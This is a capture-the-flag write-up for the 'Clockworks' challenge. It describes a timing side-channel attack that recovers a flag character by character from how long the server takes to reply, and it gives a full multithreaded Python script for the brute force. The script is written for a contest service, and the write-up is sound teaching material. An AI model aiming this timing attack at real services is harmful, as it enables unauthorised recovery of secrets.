---
layout:         writeup
title:          "Clockworks"
date:           2020-04-04 12:00:00 +0200
event:          "LCSC CTF 2020"
categories:     [writeup]
ctf_categories: [scripting]
author:         "Nanohenry"
---
# Clockworks

## TL;DR

Brute-force the flag character-by-character by testing what character causes the
longest delay on the server.

## Given information

Instructions to `nc` to a port on a URL.

## Solution

Netcatting into the address gives a prompt with the text "Give me the flag!". If
you send something that's not the flag, it returns the text "Wrong! And you
were so confident too!" and then drops the connection.

After sending some random stuff, I noticed that sometimes the text takes longer
to appear. With some experiements I found that sending characters from the flag
(I tested with the first character, "L" from the flag format) causes it to
happen around 0.9 seconds later than with other characters.

Then, since this was a scripting challenge, I wrote a simple Python script to
loop over the flag charset, append each of them to a string, send it to the
server and then see how long it takes for the server to drop the connection. It
recorded each of the times, and after all characters, it took the character with
the longest delay and printed it.

I soon noticed that after each new character, the delay kept increasing. It was
around 0.3 seconds at first, but after six characters it was at 1.5 seconds.
Since my script was checking 66 characters every iteration, it took what felt
like years to even get the first few characters.

I realised that since the individual character checks are independent of each
other, I could multithread the code and check all of them in parallel. This
turned out to work quite well.

One more problem that I had was the occasional error that apparently came from
network latency (or it was a part of the challenge :P). Some rounds the script
wouldn't find a character that took a noticably longer time than the others, and
so it would just take the one that took the longest. It would then continue
happily with the wrong result, messing up the rest of the flag.

I fixed that issue by adding a margin threshold, i.e. the minimum number of
seconds between the character that took the longest time and the one that took
the second longest time. I found that I worked quite well with a value of 0.6.

Here is the complete script:

```python
from pwn import *
import time, threading

def guess(str, k, r):
	s = time.time()
	conn = remote("[REDACTED]", 50007)
	o = conn.recvuntil(b"> ", timeout = 20)
	conn.sendline(str.encode("utf-8"))
	o = conn.recvline(timeout = 20)
	conn.close()
	if time.time() - s >= 20:
		r.append((-1, k))
	else:
		r.append((time.time() - s, k))

chars = "ABCDEFGHIJLKMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_{}0123456789"
mt = 0.6
print("Using charset " + chars)
print("Using margin threshold " + str(mt))
v = ""
while True:
	while True:
		print("--- [ CURRENT: " + v + " ] ---")
		s = [None] * len(chars)
		n = []
		for i in range(len(chars)):
			s[i] = Thread(target = guess, args = (v + chars[i], chars[i], n))
			s[i].start()
		print("Progress: ", end = "")
		for i in range(len(chars)):
			s[i].join()
			print(chars[i], end = "")
		print()
		p = []
		n = sorted(n, reverse = True)
		d = n[0][0] - n[1][0]
		print("Margin: " + str(d) + (" (!)" if d < mt else ""))
		print("Top 3: " + ", ".join(map(lambda x: x[1] + " (" + str(x[0]) + ")", n[:3])))
		if d < mt:
			print("Margin too low, running round again...")
			break
		else:
			v += n[0][1]
			print("==> " + v)
```

Round after round, the flag was slowly collected by the script.
